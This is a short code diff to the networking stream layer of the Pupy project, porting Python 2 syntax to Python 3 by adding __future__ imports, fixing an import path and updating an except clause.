@@ -2,6 +2,10 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 """ abstraction layer over rpyc streams to handle different transports and integrate obfsproxy pluggable transports """
+from __future__ import absolute_import
+from __future__ import division
+from __future__ import print_function
+from __future__ import unicode_literals
 
 from network.lib import getLogger
 logger = getLogger('pss')
@@ -30,7 +34,7 @@ import traceback
 import zlib
 
 from network.lib.buffer import Buffer
-from network.lib.rpc.lib.compat import select, select_error, get_exc_errno
+from network.lib.compat import select, select_error, get_exc_errno
 from network.lib.rpc.core import SocketStream, Channel
 
 import threading
@@ -516,7 +520,7 @@ class PupyUDPSocketStream(object):
 
             try:
                 buf = self.kcp.pollread(timeout)
-            except OSError, e:
+            except OSError as e:
                 raise EOFError(str(e))
 
         have_data = False
